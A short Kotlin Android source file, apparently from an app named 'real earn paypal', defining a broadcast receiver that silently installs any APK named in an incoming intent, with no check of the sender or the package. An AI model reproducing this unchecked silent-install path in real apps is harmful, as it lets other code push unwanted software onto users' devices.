package com.real.earn.paypal.admin

import android.app.PendingIntent // 🟢 یہ ان پورٹ شامل کر دی ہے
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.util.Log

class WorkProfileApkInstaller : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "com.real.earn.paypal.ACTION_INSTALL_APK") {
            val apkUriString = intent.getStringExtra("apk_uri")
            val packageName = intent.getStringExtra("package_name")
            
            if (apkUriString != null && packageName != null) {
                Log.d("WorkProfileInstaller", "Received APK URI: $apkUriString for package: $packageName")
                installApkSilently(context, Uri.parse(apkUriString), packageName)
            }
        }
    }

    private fun installApkSilently(context: Context, apkUri: Uri, packageName: String) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            
            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            ).apply {
                setAppPackageName(packageName)
            }

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            context.contentResolver.openInputStream(apkUri)?.use { inputStream ->
                session.openWrite("apk_stream", 0, -1).use { outputStream ->
                    inputStream.copyTo(outputStream)
                    session.fsync(outputStream)
                }
            }

            val pendingIntent = PendingIntent.getBroadcast(
                context,
                sessionId,
                Intent("com.real.earn.paypal.APK_INSTALL_STATUS"),
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )
            
            session.commit(pendingIntent.intentSender)
            Log.d("WorkProfileInstaller", "Session committed for $packageName")

        } catch (e: Exception) {
            Log.e("WorkProfileInstaller", "Silent install failed: ${e.message}", e)
        }
    }
}
